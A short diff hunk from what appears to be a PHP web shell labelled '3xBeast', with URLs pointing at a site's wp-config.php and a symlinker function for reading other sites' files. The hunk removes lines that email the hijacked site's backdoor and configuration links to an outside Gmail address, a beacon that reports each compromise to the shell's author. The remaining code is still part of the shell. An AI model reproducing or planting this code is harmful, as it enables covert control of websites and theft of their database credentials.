@@ -69,10 +69,6 @@
                   $wpconfigback=$_SERVER['SERVER_NAME']."/wp-config.php?3x=3x";
                }
             }
-            $mailme="13shell37@gmail.com";
-            $subject="3xBeast";
-            $bodyme=$indexback."\n".$configurationback."\n".$wpconfigback."\n".$wpadminback;
-            mail($mailme,$subject,$bodyme);
             }
     }
         function sym() //symlinker function
